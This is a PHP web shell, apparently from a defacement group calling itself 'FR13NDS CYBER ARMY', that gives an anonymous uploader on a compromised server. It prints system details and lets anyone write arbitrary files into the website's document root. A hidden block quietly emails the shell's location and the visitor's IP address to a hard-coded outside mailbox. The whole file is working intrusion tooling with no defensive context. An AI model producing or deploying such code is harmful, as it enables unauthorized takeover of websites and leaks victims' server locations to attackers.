//Powered By Mr.Colded X Mr.Cold//
//Team : 3RROR YOUR SYSTEM //
<title>./CryMera - FR13NDS CYBER ARMY </title><center>
<body bgcolor="black">
    <br><br><br><br>
    <br>
    <font color="lime" size="5">> ./CryMera <</font>
<font color="red"></center><br><br>
    <center>
<?php
echo "FR13NDS CYBER ARMY - Home Root Uploader<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='Upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Sukses Cok! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "Gagal Upload Di Document Root.";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "Sukses Upload <b>$files</b> Di Folder Ini";
        } else {
            echo "Gagal mek!";
        }
    }
}
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'jajami81@yahoo.com, jajami81@yahoo.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>